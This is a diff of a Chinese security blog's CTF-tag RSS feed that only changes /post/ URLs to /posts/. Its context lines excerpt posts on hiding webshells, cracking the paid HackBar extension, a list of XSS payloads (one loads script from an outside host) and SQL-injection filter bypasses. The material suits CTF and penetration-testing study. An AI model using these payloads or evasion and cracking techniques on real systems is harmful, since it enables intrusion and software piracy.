@@ -1,4 +1,4 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>ctf - 标签 - zu1k</title><link>https://lgf.im/tags/ctf/</link><description>ctf - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/ctf/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/post/security/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>ctf - 标签 - zu1k</title><link>https://lgf.im/tags/ctf/</link><description>ctf - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/ctf/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/posts/security/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
 <p>转自：酒仙桥六号部队 <a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>
 这个公众号的文章质量都非常高，推荐大家关注</p>
 </blockquote>
@@ -359,7 +359,7 @@
 <p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p>
 </li>
 </ol>
-]]></description></item><item><title>HackBar破解</title><link>https://lgf.im/post/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
+]]></description></item><item><title>HackBar破解</title><link>https://lgf.im/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
 <p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p>
 <p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
 <p></p>
@@ -534,7 +534,7 @@
 <p></p>
 <h2 id="总结">总结</h2>
 <p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
-]]></description></item><item><title>xss payload</title><link>https://lgf.im/post/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
+]]></description></item><item><title>xss payload</title><link>https://lgf.im/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
 <p>1.普通的XSS JavaScript注入</p>
 <pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
 </code></pre>
@@ -662,7 +662,7 @@
 <pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
 </code></pre>
 <p>40.IMG VBscript</p>
-<pre><code>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/post/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
+<pre><code>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></pre>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
 <blockquote>
 <p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法</p>
 </blockquote>
